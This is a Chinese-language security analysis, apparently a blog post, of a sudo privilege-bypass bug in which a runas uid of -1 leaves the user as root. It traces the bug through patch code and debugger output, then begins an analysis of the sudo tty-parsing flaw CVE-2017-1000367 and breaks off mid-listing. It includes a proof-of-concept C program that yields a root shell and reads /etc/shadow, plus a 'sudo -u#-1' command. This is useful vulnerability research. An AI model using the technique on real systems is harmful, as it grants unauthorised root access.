    bin:*:18113:0:99999:7:::
    sys:*:18113:0:99999:7:::
    ...
## 漏洞分析
从漏洞补丁
关于-1的处理改动，下面这两段代码位于lib/util/strtoid.c中的sudo_strtoid_v1
函数（分别为处理64位和32位的两个函数），补丁加入了对 -1 和 UINT_MAX（4294967295）的判断，如果不是才会放行。
64位 sudo_strtoid_v1 函数
32位 sudo_strtoid_v1 函数
在command_info_to_details中，通过调用sudo_strtoid_v1函数获取用户指定id，并存入details->uid中。
        743         if (strncmp("runas_uid=", info[i], sizeof("runas_uid=") - 1) == 0) {
        744             cp = info[i] + sizeof("runas_uid=") - 1;
        745             id = sudo_strtoid(cp, NULL, NULL, &errstr);
        746             if (errstr != NULL)
        747             sudo_fatalx(U_("%s: %s"), info[i], U_(errstr));
        748             details->uid = (uid_t)id;
                   // details=0x00007fff2110e4e0  →  [...]  →  0x00000000ffffffff
     →  749             SET(details->flags, CD_SET_UID);
        750             break;
        751         }
        752  #ifdef HAVE_PRIV_SET
        753         if (strncmp("runas_privs=", info[i], sizeof("runas_privs=") - 1) == 0) {
        754                      const char *endp;
    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
    [#0] Id 1, Name: "sudo", stopped 0x564bb9b02e61 in command_info_to_details (), reason: SINGLE STEP
    ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
    [#0] 0x564bb9b02e61 → command_info_to_details(info=0x564bba8aaba0, details=0x564bb9d140c0 )
    [#1] 0x564bb9b00653 → main(argc=0x3, argv=0x7fff2110e7d8, envp=0x7fff2110e7f8)
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    749             SET(details->flags, CD_SET_UID);
    1: *details = {
      uid = 0xffffffff, 
      euid = 0x0, 
      gid = 0x0, 
      egid = 0x0,
然后使用details->uid赋值details->euid，此时结构中的uid和euid均为0xffffffff。
        808      if (!ISSET(details->flags, CD_SET_EUID))
        809     details->euid = details->uid;
                 // details=0x00007fff2110e4e0  →  [...]  →  0xffffffffffffffff
     →  810      if (!ISSET(details->flags, CD_SET_EGID))
        811     details->egid = details->gid;
    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
    [#0] Id 1, Name: "sudo", stopped 0x564bb9b03741 in command_info_to_details (), reason: SINGLE STEP
    ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
    [#0] 0x564bb9b03741 → command_info_to_details(info=0x564bba8aaba0, details=0x564bb9d140c0 )
    [#1] 0x564bb9b00653 → main(argc=0x3, argv=0x7fff2110e7d8, envp=0x7fff2110e7f8)
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    810     if (!ISSET(details->flags, CD_SET_EGID))
    1: *details = {
      uid = 0xffffffff, 
      euid = 0xffffffff, 
      ...
调试发现，在main函数中，程序先使用setuid(ROOT_UID)将uid设置为0，然后执行run_command(&command_details)，然后依次执行sudo_execute
-> exec_cmnd ->
exec_setup。PS：这里的command_details就是command_info_to_details中保存的details。
        286         if (ISSET(sudo_mode, MODE_BACKGROUND))
        287         SET(command_details.flags, CD_BACKGROUND);
        288         /* Become full root (not just setuid) so user cannot kill us. */
        289         if (setuid(ROOT_UID) == -1)
        290         sudo_warn("setuid(%d)", ROOT_UID);
     →  291         if (ISSET(command_details.flags, CD_SUDOEDIT)) {
        292         status = sudo_edit(&command_details);
        293         } else {
        294         status = run_command(&command_details);
        295         }
        296         /* The close method was called by sudo_edit/run_command. */
    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
    [#0] Id 1, Name: "sudo", stopped 0x55fb48d3d707 in main (), reason: SINGLE STEP
    ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
    [#0] 0x55fb48d3d707 → main(argc=0x3, argv=0x7ffdc681cd08, envp=0x7ffdc681cd28)
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    291         if (ISSET(command_details.flags, CD_SUDOEDIT)) {
    gef➤  p command_details
    $3 = {
      uid = 0xffffffff, 
      euid = 0xffffffff, 
      gid = 0x3e8, 
      egid = 0x3e8, 
      ...
在exec_setup函数中存在如下语句，程序会使用details结构中的uid信息来设置uid，在调试环境下使用的是setresuid函数（第一个），它可以设置用户的uid、euid和suid，但如果某个参数为-1，就不会改变该参数对应的id值。然而details->uid和details->euid均为-1。
    #if defined(HAVE_SETRESUID)
        if (setresuid(details->uid, details->euid, details->euid) != 0) {
        sudo_warn(U_("unable to change to runas uid (%u, %u)"),
            (unsigned int)details->uid, (unsigned int)details->euid);
        goto done;
        }
    #elif defined(HAVE_SETREUID)
        if (setreuid(details->uid, details->euid) != 0) {
        sudo_warn(U_("unable to change to runas uid (%u, %u)"),
            (unsigned int)details->uid, (unsigned int)details->euid);
        goto done;
        }
    #else
        /* Cannot support real user ID that is different from effective user ID. */
        if (setuid(details->euid) != 0) {
        sudo_warn(U_("unable to change to runas uid (%u, %u)"),
            (unsigned int)details->euid, (unsigned int)details->euid);
        goto done;
测试：编译如下测试程序，并赋予其与sudo相同的权限，以便模拟sudo程序中先执行setuid(0)，然后再执行setresuid(-1, -1,
-1)的场景。使用testtest用户运行该程序，成功获取root权限。PS：如果你设置的id为1234的话，程序就会执行setresuid(0x4d2,
0x4d2, 0x4d2)，这样你的uid就被设置为1234了。
    include 
    int main() {
      setuid(0);
      setresuid(-1, -1, -1);
      execve("/bin/bash",NULL,NULL);
      return 0;
    }
    testtest@ubuntu:/home/strawberry/Desktop$ ./testid
    root@ubuntu:/home/strawberry/Desktop# id
    uid=0(root) gid=1001(testtest) groups=1001(testtest)
    root@ubuntu:/home/strawberry/Desktop# cat /etc/shadow
    root:!:18283:0:99999:7:::
    daemon:*:18113:0:99999:7:::
    bin:*:18113:0:99999:7:::
    sys:*:18113:0:99999:7:::
    ...
## 漏洞总结
sudo在配置了类似于testtest ALL=(ALL, !root)
/usr/bin/id语句后，存在一个权限绕过漏洞。程序首先会通过setuid(0)将uid设置为0，然后执行setresuid（id, id,
id）将uid等设置为id的值，id可为testtest用户指定的任意值。当id为-1（4294967295）时，setresuid不改变uid、euid和suid中的任何一个，因而用户的uid还是为0，可以达到权限提升的效果，但这一步在输入正确密码之后，因而攻击者还需获取账户密码，再加上这种配置，也是比较困难的。
另外，如果允许用户以任何用户身份运行命令（包括root用户），是不受此漏洞影响的，因为本来用户输了密码之后就可以以root身份运行命令吧。允许用户以特定其他用户身份运行命令也不受此漏洞影响，如下所示。
    ************ /etc/sudoers ***********
    testtest ALL=(strawberry) /usr/bin/id
    testtest@ubuntu:/home/strawberry/Desktop$ sudo -u strawberry id
    [sudo] password for testtest:       
    uid=1000(strawberry) gid=1000(strawberry) groups=1000(strawberry),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
    testtest@ubuntu:/home/strawberry/Desktop$ sudo -u#-1 id
    Sorry, user testtest is not allowed to execute '/usr/bin/id' as #-1 on ubuntu.
**参考文章**
  1. 
  2. 
  3. 
  4. 
# CVE-2017-1000367 sudo本地提权漏洞
## 漏洞简讯
2017年5月30日，国外安全研究人员发现sudo本地提权漏洞，该漏洞编号为CVE-2017-1000367，漏洞源于sudo
在获取tty时没有正确解析/proc/[pid]/stat
的内容，本地攻击者可能会使用此漏洞来覆盖文件系统上的任何文件，从而监控其它用户终端设备或获取root权限。
研究员发现 Linux 系统中 sudo 的get_process_ttyname() 有这样的漏洞：
这个函数会打开 “ /proc/[pid]/stat ”，并从 field 7 (tty_nr) 中读取设备的 tty 编号。但这些field
是以空格分开的，而 field 2中（comm，command的文件名）可以包含空格。
那么，当我们从符号链接 “./1 ” 中执行 sudo 命令时，get_process_ttyname() 就会调用sudo_ttyname_dev()
来在内置的 search_devs[] 中努力寻找并不存在的“1”号 tty设备.
然后，sudo_ttyname_dev() 开始调用 sudo_ttyname_scan() 方法，遍历“/dev”目录，并以广度优先方式寻找并不存在的
tty 设备“1”。
最后，在这个遍历过程中，我们可以利用漏洞让当前的用户伪造自己的 tty
为文件系统上任意的字符设备，然后在两个竞争条件下，该用户就可以将自己的tty伪造成文件系统上的任意文件。
值得注意的是，该漏洞第一次修复是在1.8.20p1版本，但该版本仍存在利用风险，可用于劫持另一个用户的终端。该漏洞最终于sudo1.8.20p2版本中得以修复（此处有第二次补丁:
在1.8.20p2之前的sudo版本中，还存在以下漏洞利用思路：
具有sudo特权的用户可将stdin、stdout和 stderr
连接到他们选择的终端设备上来运行命令。用户可以选择与另一个用户当前正在使用的终端相对应的设备号，这使得攻击者可以对任意终端设备进行读写访问。根据允许命令的不同，攻击者有可能从另一个用户的终端读取敏感数据（例如密码）。
## 影响范围
  1. 1.7.10 ，如下图所示，此处修改发生在get_process_ttyname函数内（位于/src/ttyname.c中），从注释上看改变了获取tty
dev的方式，补丁之前通过空格数找到第7项（tty dev），补丁之后的流程是首先找到第二项的 ')' ，然后从第二项终止处通过空格数定位到第七项：
下面来看之前代码，首先获取pid，然后通过解析/proc/pid/stat来获取设备号（通过空格数），如果第七项不为0那就是设备号：
    char * get_process_ttyname(char *name, size_t namelen)
    {
        char path[PATH_MAX], *line = NULL;
        char *ret = NULL;
        size_t linesize = 0;
        int serrno = errno;
        ssize_t len;
        FILE *fp;
        debug_decl(get_process_ttyname, SUDO_DEBUG_UTIL)